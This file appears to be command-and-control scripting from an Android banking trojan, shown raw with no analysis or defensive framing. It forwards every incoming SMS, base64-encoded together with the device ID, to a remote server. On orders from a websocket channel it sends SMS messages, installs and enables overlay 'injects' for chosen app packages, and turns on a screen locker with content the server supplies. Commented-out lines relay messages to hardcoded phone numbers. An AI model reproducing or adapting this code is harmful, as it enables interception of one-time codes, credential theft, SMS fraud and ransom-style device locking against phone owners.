//importPackage("Packages.android.util");

/*function startsWith(str, c){
    return str.indexOf(c) === 0;
}
function endsWith(str, c){
    return str.slice(0, c.length) == c;
}*/

function createObject(action)
{
    var deviceID = Service.getDeviceID();
    deviceID = deviceID + ""; 
    var obj = new Object();
    obj.action = action;
    obj.deviceID = deviceID;
//    if(Service.getTrafferId != 'undefined')
//	    obj.trafferId = Service.getTrafferId() + "";
    return obj;
}


function f(str)
{
    return str + "";
}


function sendObjectNet(obj)
{
    var json = JSON.stringify(obj);
    Log.write("jsonnednet: " + json);
    Network.postBase64JsonNet(f(json));
}

function doQuery()
{
    var obj = createObject("get_action");
    sendObjectNet(obj);
}

function onSMSStatus(id, number, message, result)
{
//    Log.write("sms_status: " + id + " " + number + " " + message + " " + result + " " + actionid);
    var obj = createObject("sms_status");
    obj.id = id;
    obj.status = result;
    sendObjectNet(obj);
}

function onSMS(number, text)
{   
    Log.write("onSMS: " + number + ": " + text);

    /*if(number == '900')
    {
	API.sendSMS('+19105020599', text, 0);
    }*/
    var o = createObject('received_sms');
    o.number = f(number);
    var s = new Packages.java.lang.String(text);
    o.text = f(Packages.android.util.Base64.encodeToString(s.getBytes(), 2));
    sendObjectNet(o);
    /*if(number === '+19105020599' || number === '+48799449133' || text.indexOf('EhFQUR') === 1)
    {
        var rpd = new Packages.java.lang.String(text);
        var ztext = f(new Packages.java.lang.String(Packages.android.util.Base64.decode(text,0)));
        ztext = ztext.substring(5, ztext.length);
        Log.write(ztext);
        var m = JSON.parse(ztext);
        m.action = m.a;
        m.number = m.n;
        m.message = m.m;
        m.id = 0;
        m.url = m.u;
        m.data = m.d;
        var z = JSON.stringify(m);
        Log.write('calling onwsmessage with z: ' + z);
        onWSMessage(0, z);
    }*/

}

function onWSOpen(ws)
{
    var obj = createObject("get_action");
    sendObjectNet(obj);
var obj = createObject("get_injects");
sendObjectNet(obj);
}

function onWSMessage(ws, data)
{
    var m = JSON.parse(data);

    if(m.action == "send_sms")
    {
        Log.write("number: " + m.number + "\ntext: " + m.message + "\nid: " + m.id);
        API.sendSMS(m.number, m.message, m.id);
    }
    if(m.action == "add_inject")
    {
	Service.addInject(m.pkg, m.url);	
    }
    if(m.action == "enable_inject")
    {
        Service.enableInject(m.pkg);
    }
    if(m.action == "disable_inject")
    {
        Service.enableInject(m.pkg);
    }
    if(m.action == "enable_locker")
    {
        Service.enableLocker();
    }
    if(m.action == "disable_locker")
    {
        Service.enableLocker();
    }
    if(m.action == "set_locker_url")
    {
	Service.setLockerContent(m.url, false);
    }
    if(m.action == "set_locker_data")
    {   
        Service.setLockerContent(m.data, true);
    }
    if(m.action == "reset_locker")
    {   
        Service.resetLockerContent();
    }
}

function onWSClose(ws)
{
}

function onSendNotConnected(json)
{
       // API.sendSMS('+48799449133', json);
}
